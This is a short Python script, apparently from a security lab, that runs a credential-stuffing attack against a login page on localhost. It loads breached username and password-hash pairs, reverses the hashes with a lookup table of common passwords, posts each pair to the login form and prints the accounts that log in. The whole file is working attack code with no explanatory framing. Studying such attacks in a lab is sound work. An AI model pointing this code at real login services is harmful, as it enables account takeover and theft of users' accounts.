from csv import reader
import json
from requests import post, codes

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
HASHED_BREACH_PATH = "app/scripts/breaches/hashed_breach.csv"
COMMON_PASSWORDS_LOOKUP_TABLE_PATH = "common_passwords_lookup_table.json"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def credential_stuffing_attack(creds):
    hash_dict = get_lookup_table()
    for cred in creds:
        status = attempt_login(cred[0],hash_dict[cred[1]])
        if status:
            print(cred)
    return

def get_lookup_table():
    with open(COMMON_PASSWORDS_LOOKUP_TABLE_PATH) as json_file:
        hashes = json.load(json_file)
    return hashes

def main():
    # creds = load_breach(PLAINTEXT_BREACH_PATH)
    # credential_stuffing_attack(creds)
    creds = load_breach(HASHED_BREACH_PATH)
    credential_stuffing_attack(creds)

if __name__ == "__main__":
    main()
